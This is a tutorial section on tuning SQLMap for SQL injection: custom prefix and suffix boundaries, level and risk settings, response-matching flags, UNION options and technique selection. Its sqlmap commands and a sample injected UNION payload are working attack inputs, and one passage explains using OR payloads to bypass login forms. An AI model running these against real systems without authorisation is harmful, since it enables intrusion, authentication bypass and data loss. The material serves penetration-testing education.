# Attack Tuning

SQLMap works well out of the box for common scenarios, but real-world targets often have non-standard query structures, WAF rules, or response patterns that require tuning before detection succeeds.

***

## Payload Structure: Vectors and Boundaries

Every SQLMap payload has two components:

- **Vector**: the SQL code being injected (e.g., `UNION ALL SELECT 1,2,VERSION()`)
- **Boundary**: the prefix and suffix wrapping the vector to make the query syntactically valid (e.g., `%'))` before and `-- -` after)

Understanding this separation explains why `--prefix` and `--suffix` exist: when the automatic boundary detection fails because the query has an unusual structure, you supply the boundaries manually.

***

## Custom Prefix and Suffix

Use when the vulnerable query has unusual nesting that SQLMap's auto-detection does not cover:

```bash
sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"
```

For a PHP query like:
```php
$query = "SELECT id,name FROM users WHERE id LIKE (('" . $_GET["q"] . "')) LIMIT 0,1";
```

The resulting injected query becomes:
```sql
SELECT id,name FROM users WHERE id LIKE (('test%'))
UNION ALL SELECT 1,2,VERSION()-- -')) LIMIT 0,1
```

The `%'))` closes the `LIKE ((` expression and both parentheses, while `-- -` comments out the trailing `')) LIMIT 0,1`. Without the correct boundaries, every payload produces a syntax error and SQLMap reports no injection.

***

## Level and Risk Settings

| Setting | Range | Default | Controls |
|---------|-------|---------|---------|
| `--level` | 1-5 | 1 | Which parameters are tested and how many boundary variants |
| `--risk` | 1-3 | 1 | Which payload types are used, based on potential for damage |

```bash
# Thorough scan covering all parameters including cookies and headers
sqlmap -u "http://target.com/?id=1" --level=5 --risk=2 --batch

# See exactly which payloads are being sent at each level
sqlmap -u "http://target.com/?id=1" --level=5 -v 3 --batch
```

The payload count difference is significant:

| Level/Risk | Payloads per Parameter |
|-----------|----------------------|
| Default (1/1) | ~72 |
| Maximum (5/3) | ~7,865 |

Risk 3 adds OR-based payloads, which are dangerous against UPDATE and DELETE queries because `OR 1=1` in a DELETE statement deletes every row. Only use `--risk 3` when you have confirmed the injection point is in a SELECT statement, or when the test scope explicitly permits data modification.

***

## When to Raise Each Setting

```
--level 2-3:  When cookies or User-Agent headers may be injectable
--level 4-5:  When Referer or other less-common headers need testing
--risk 2:     When heavy time-based tests are needed
--risk 3:     When OR-based payloads are required (e.g., login forms where
              AND-based payloads cannot bypass authentication)
```

Login forms often require `--risk 3` because boolean-bypass on authentication typically needs OR conditions, and `--risk 1` deliberately excludes OR payloads to avoid modifying data in UPDATE/DELETE contexts.

***

## Advanced Response Tuning

When responses are large, dynamic, or noisy, SQLMap's default comparison logic may struggle. These flags tell it what signal to focus on:

| Flag | Use When | Example |
|------|---------|---------|
| `--code=200` | TRUE/FALSE differ by HTTP status code | `--code=200` |
| `--titles` | TRUE/FALSE differ only in `<title>` tag | `--titles` |
| `--string=success` | A specific string appears only in TRUE responses | `--string="Welcome"` |
| `--not-string=fail` | A specific string appears only in FALSE responses | `--not-string="Invalid"` |
| `--text-only` | Response has heavy JS/CSS noise masking differences | `--text-only` |
| `--technique=BEU` | Restrict to specific injection types | `--technique=BEU` |

The `--string` flag is the most impactful of these. When SQLMap finds a reliable static string to anchor TRUE detection on (as seen in the previous section's `--string="luther"` discovery), comparison becomes deterministic and false positives become nearly impossible.

***

## UNION Tuning Flags

When automatic UNION detection fails, these flags supply the missing information directly:

```bash
# Manually specify column count when ORDER BY detection fails
sqlmap -u "http://target.com/?id=1" --union-cols=17

# Use a string filler instead of NULL (some DBs require non-NULL values)
sqlmap -u "http://target.com/?id=1" --union-char='a'

# Oracle requires FROM in every SELECT; supply the table manually
sqlmap -u "http://target.com/?id=1" --union-from=users
```

The Oracle case (`--union-from`) is the most common reason UNION detection silently fails on Oracle databases. Oracle requires `SELECT x FROM table` syntax where other databases allow `SELECT x` without a FROM clause. If DBMS fingerprinting has not yet identified the database as Oracle before the UNION phase runs, the FROM clause will be absent and every UNION payload will return an error.

***

## Technique Selection

Restricting techniques speeds up scans and avoids side effects:

```bash
# Boolean, error-based, and UNION only (skip time-based and stacked)
sqlmap -u "http://target.com/?id=1" --technique=BEU --batch

# Time-based only (when no visible output exists)
sqlmap -u "http://target.com/?id=1" --technique=T --batch

# All except time-based (avoids timeout issues on slow networks)
sqlmap -u "http://target.com/?id=1" --technique=BEUSQ --batch
```

Removing time-based blind (`T`) from the technique string is particularly useful on high-latency connections or heavily loaded servers where response times are inconsistent, as the statistical model for time-based detection requires reliable baseline measurements to work accurately.
